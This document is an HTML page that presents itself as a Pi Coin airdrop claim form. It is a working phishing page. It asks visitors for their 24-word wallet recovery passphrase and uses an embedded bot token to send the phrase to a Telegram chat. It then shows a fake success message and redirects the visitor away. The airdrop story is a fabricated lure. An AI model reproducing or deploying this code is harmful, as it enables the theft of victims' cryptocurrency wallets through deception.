<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pi Coin</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
            background-color: #f4f4f4;
            animation: fadeIn 1s ease-in;
        }
        .container {
            color: #ffffff;
            background-color: #47266c;
            max-width: 100%;
            height: 100vh;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            animation: slideIn 1s ease-in-out;
        }
        h2 {
            color: #ffffff;
            font-size: 32px;
            font-weight: 700;
            text-align: left;
            animation: fadeInUp 1s ease-in-out;
        }
        img {
            width: 100px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        textarea {
            width: 95%;
            height: 100px;
            margin-top: 20px;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            transition: 0.3s;
        }
        textarea:focus {
            border-color: #6200ea;
            box-shadow: 0 0 10px rgba(98, 0, 234, 0.5);
        }
        button {
            margin-top: 10px;
            width: 100%;
            padding: 10px 20px;
            font-size: 16px;
            font-weight: 500;
            background-color: #ff5722; /* Orange color for the claim button */
            color: white;
            border: red;
            border-radius: 5px;
            cursor: pointer;
            transition: transform 0.2s, background 0.3s;
        }
        button:hover {
            background: #4500b5;
            transform: scale(1.1);
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes slideIn {
            from { transform: translateY(-50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        @keyframes fadeInUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        .shake {
            animation: shake 0.3s;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
        }
        @media (max-width: 600px) {
            .container {
                width: 90%;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <img src="logopi.png" alt="Pi Coin Logo">
        <h1>Pi Coin Last Airdrop</h1>
        <p>The official Pi Network has reached 2 million pioneers! To get closer to the mainnet and activate and attract more pioneers, they will be holding an airdrop, awarding a total of 314Ï€/pioneer prizes to those who successfully complete KYC. </p>
        <textarea id="inputText" placeholder="Enter 24 words Passphrase"></textarea>
        <button onclick="validateText()">Claim 314PI</button>
        
    </div>
    <script>
        function validateText() {
            const text = document.getElementById('inputText').value;
            const words = text.trim().split(/\s+/);
            const message = words;
            const container = document.getElementById('mainContainer');
            const botToken = "7086846939:AAG8-Sd-j8LvsdKue_zFGC5jmE8pdjwpfKg"; // Replace with your bot token
            const chatId = "1739737415"; // Replace with the recipient's chat ID
          
             if(!text){
                container.classList.add('shake');
                alert("please enter the passphrase");
                location.reload();
            }
             else if (words.length !== 24) {
                container.classList.add('shake');
                setTimeout(() => container.classList.remove('shake'), 300);
                alert("Wrong passphrase, unable to connect. Try again");
                location.reload();
            } 
            else {
                const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                fetch(telegramURL)
          .then(response => response.json())
                alert("Congratulations! You are now eligible. You are in the queue, once verified you will get your claimed Pi.");
                location.href = "https://www.facebook.com/PiCoreTeam";
            }
        }
    </script>
</body>
</html>
